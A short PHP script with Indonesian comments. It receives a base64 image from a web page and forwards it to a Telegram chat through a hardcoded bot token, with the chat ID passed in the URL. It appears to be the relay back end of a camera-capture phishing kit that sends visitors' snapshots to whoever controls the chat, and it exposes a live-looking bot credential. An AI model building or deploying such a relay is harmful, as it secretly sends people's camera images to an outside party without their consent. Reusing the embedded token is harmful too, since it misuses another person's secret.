<?php
// Token & ID dari parameter
$botToken = '7525794586:AAH9YlfXazDX1zzx1ss23q8RuIqyMJcVzZI';
$uid = isset($_GET['uid']) ? $_GET['uid'] : null;
$imgData = isset($_POST['cat']) ? $_POST['cat'] : null;

if (!$uid || !$imgData) {
    http_response_code(400);
    echo json_encode(['error' => 'Missing data']);
    exit;
}

// Hilangkan prefix "data:image/png;base64,"
$imgData = preg_replace('#^data:image/\w+;base64,#i', '', $imgData);
$imgData = str_replace(' ', '+', $imgData);
$decodedData = base64_decode($imgData);

// Simpan gambar sementara
$tmpFile = tempnam(sys_get_temp_dir(), 'img_') . '.png';
file_put_contents($tmpFile, $decodedData);

// Kirim ke Telegram
$sendUrl = "https://api.telegram.org/bot$botToken/sendPhoto";

$postFields = [
    'chat_id' => $uid,
    'caption' => '📸 Gambar dari halaman kamu',
    'photo' => new CURLFile($tmpFile)
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $sendUrl);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
curl_close($ch);

// Hapus file temp
unlink($tmpFile);

// Kirim response ke JS
echo $response;
